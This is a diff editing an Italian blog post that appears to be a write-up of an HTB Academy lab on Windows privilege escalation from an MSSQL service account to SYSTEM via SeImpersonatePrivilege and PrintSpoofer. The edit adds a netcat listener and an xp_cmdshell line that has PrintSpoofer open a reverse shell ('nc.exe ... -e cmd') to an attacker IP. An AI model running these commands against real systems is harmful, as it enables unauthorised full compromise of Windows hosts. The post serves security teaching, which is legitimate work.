@@ -13,7 +13,7 @@ A volte basta ottenere l'esecuzione di comandi nel contesto di un account di ser
 
 È un diritto legittimo, utilizzato da numerosi servizi Windows per operare temporaneamente con l'identità degli utenti autenticati. Tuttavia, quando viene combinato con un meccanismo di impersonazione sfruttabile, può consentire a un attaccante di passare da un account di servizio a `NT AUTHORITY\SYSTEM`.
 
-In questo laboratorio di HTB Academy ho ricostruito proprio questa catena:
+Per la dimostrazione ho utilizzato una macchina del modulo **[Windows Privilege Escalation di HTB Academy](https://academy.hackthebox.com/module/details/67)**, in cui ho ricostruito proprio questa catena:
 
 **Accesso MSSQL → esecuzione di comandi → identificazione di SeImpersonatePrivilege → PrintSpoofer → SYSTEM.**
 
@@ -102,26 +102,13 @@ La presenza di `Enabled` non garantisce che l'attacco funzionerà. Indica però 
 
 ## 4. La famiglia Potato: dal privilegio al vettore di escalation
 
-Nel mondo della Windows Privilege Escalation esiste una famiglia di tecniche comunemente conosciuta come **Potato**. Il principio comune è abusare di determinati meccanismi di autenticazione o comunicazione tra processi per ottenere un contesto di sicurezza più privilegiato. Gli strumenti, però, non sono tutti intercambiabili.
+Nel mondo della Windows Privilege Escalation esiste una famiglia di tecniche comunemente conosciuta come **Potato**. Il principio comune è abusare di determinati meccanismi di autenticazione o comunicazione tra processi per ottenere un contesto di sicurezza più privilegiato. Gli strumenti, però, non sono tutti intercambiabili:
 
-**JuicyPotato** è una delle tecniche storiche più conosciute. Sfrutta particolari comportamenti legati a COM/DCOM e NTLM per ottenere token privilegiati utilizzabili in un'escalation. La tecnica originale incontra limitazioni importanti a partire da Windows 10 versione 1809 e Windows Server 2019.
+- **JuicyPotato** — storico, sfrutta COM/DCOM e NTLM, ma **non funziona** da Windows 10 1809 / Windows Server 2019 in poi;
+- **RoguePotato** — supera alcune di quelle limitazioni con un meccanismo basato su RPC;
+- **PrintSpoofer** — sviluppato da itm4n, sfrutta il servizio **Print Spooler** di Windows e le **named pipe**; resta efficace anche sui sistemi recenti.
 
-**RoguePotato** è una tecnica successiva che affronta alcune delle limitazioni incontrate dai precedenti attacchi basati sull'impersonazione. Utilizza un meccanismo differente che coinvolge l'autenticazione e la comunicazione RPC.
-
-**PrintSpoofer** è lo strumento che utilizzo nel laboratorio. Sviluppato da itm4n, sfrutta un'interazione con il servizio Windows Print Spooler per ottenere una connessione privilegiata attraverso una named pipe. La sua efficacia dipende dalla configurazione del sistema e dalla disponibilità del meccanismo utilizzato.
-
-### Perché ho scelto PrintSpoofer?
-
-Nel laboratorio gli strumenti necessari erano già disponibili nella directory `C:\tools`. Ne verifico il contenuto attraverso SQL Server:
-
-```text
-SQL> xp_cmdshell dir C:\tools
-```
-
-![Contenuto della directory C:\tools con PrintSpoofer, JuicyPotato e RoguePotato](/blog/assets/img/seimpersonate/02-arsenal.png)
-*Figura 2 — Gli strumenti predisposti nell'ambiente HTB Academy. Il sistema del laboratorio utilizza Windows Server 2016; per questa dimostrazione scelgo PrintSpoofer.*
-
-La scelta non dipende semplicemente dal fatto che PrintSpoofer sia più recente. Voglio osservare una tecnica che utilizza le named pipe e il servizio di stampa per mostrare concretamente come l'impersonazione possa diventare un problema di sicurezza.
+Per questa dimostrazione ho scelto **PrintSpoofer** per un motivo preciso: è **affidabile anche sulle versioni moderne di Windows** (dove JuicyPotato è ormai tagliato fuori), è pulito e permette di mostrare con chiarezza *come* una named pipe e un servizio privilegiato trasformino `SeImpersonate` in codice eseguito come SYSTEM. Puoi scaricarlo dal [repository ufficiale di itm4n](https://github.com/itm4n/PrintSpoofer).
 
 ## 5. Come funziona realmente PrintSpoofer?
 
@@ -147,19 +134,19 @@ Arriviamo alla parte pratica. Nel laboratorio abbiamo già verificato tre condiz
 
 Resta da verificare se PrintSpoofer riesce effettivamente a sfruttare il vettore scelto.
 
-### Preparazione della sessione di laboratorio
-
-Per osservare il risultato dell'esecuzione privilegiata, nell'ambiente HTB Academy era stato predisposto un listener Netcat sulla macchina di testing:
+Avvio un **listener** sulla macchina d'attacco, in ascolto sulla porta 8443:
 
 ```bash
 sudo nc -lnvp 8443
 ```
 
-La dimostrazione originale utilizzava PrintSpoofer per avviare, nel contesto privilegiato ottenuto, un processo che stabiliva una sessione di ritorno verso il listener. La verifica tecnica dell'escalation, tuttavia, non dipende dal fatto di utilizzare una reverse shell: ciò che conta è dimostrare l'identità e il contesto del processo creato.
+Poi, dal contesto SQL, eseguo **PrintSpoofer** chiedendogli di aprire — col token SYSTEM impersonato — una reverse shell verso il listener:
 
-### Esecuzione di PrintSpoofer
+```text
+SQL> xp_cmdshell c:\PrintSpoofer.exe -c "c:\nc.exe 10.10.15.132 8443 -e cmd"
+```
 
-Dal contesto SQL viene eseguito PrintSpoofer con l'obiettivo di avviare un processo privilegiato. L'output restituito dallo strumento contiene due messaggi fondamentali:
+L'output dello strumento contiene due messaggi fondamentali:
 
 ```text
 [+] Found privilege: SeImpersonatePrivilege
@@ -167,16 +154,16 @@ Dal contesto SQL viene eseguito PrintSpoofer con l'obiettivo di avviare un proce
 ```
 
 ![Output di PrintSpoofer con il privilegio rilevato e CreateProcessAsUser() OK](/blog/assets/img/seimpersonate/03-printspoofer.png)
-*Figura 3 — PrintSpoofer individua SeImpersonatePrivilege e segnala che la creazione del processo è riuscita.*
+*Figura 2 — PrintSpoofer individua SeImpersonatePrivilege e segnala che la creazione del processo è riuscita.*
 
-Il primo messaggio conferma che il processo possiede il privilegio richiesto. Il secondo indica che la creazione del nuovo processo attraverso l'API Windows `CreateProcessAsUser()` è riuscita. È un risultato significativo, ma per verificare l'escalation dobbiamo controllare direttamente l'identità del processo ottenuto.
+Il primo messaggio conferma che il processo possiede il privilegio richiesto; il secondo che la creazione del nuovo processo tramite l'API Windows `CreateProcessAsUser()` è riuscita. Per verificare l'escalation controllo direttamente l'identità del processo ottenuto.
 
 ### Verifica finale: whoami
 
-Nella sessione di laboratorio eseguo `whoami` e `hostname`. Il risultato restituisce `nt authority\system` su `WINLPE-SRV01`.
+Sul listener arriva la shell. Eseguo `whoami` e `hostname`: la risposta è `nt authority\system` su `WINLPE-SRV01`.
 
 ![Sessione ottenuta nel laboratorio con output di whoami e hostname](/blog/assets/img/seimpersonate/04-system.png)
-*Figura 4 — La verifica finale conferma l'esecuzione nel contesto NT AUTHORITY\SYSTEM sul sistema WINLPE-SRV01.*
+*Figura 3 — La verifica finale conferma l'esecuzione nel contesto NT AUTHORITY\SYSTEM sul sistema WINLPE-SRV01.*
 
 Abbiamo così dimostrato che l'escalation è riuscita. All'inizio del laboratorio il nostro contesto di esecuzione era `nt service\mssql$sqlexpress01`; alla fine è `nt authority\system`.
 
@@ -260,8 +247,3 @@ La lezione non riguarda lo strumento, ma **il modo in cui Windows gestisce ident
 - [PrintSpoofer — Repository ufficiale di itm4n](https://github.com/itm4n/PrintSpoofer)
 - [Impacket — Repository ufficiale Fortra](https://github.com/fortra/impacket)
 - [Microsoft Sysinternals — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
-
-<aside class="readalso">
-  <span class="readalso-k">Prossimo approfondimento</span>
-  <a href="#">Windows Access Token: come funzionano privilegi, impersonation token e integrity level</a>
-</aside>
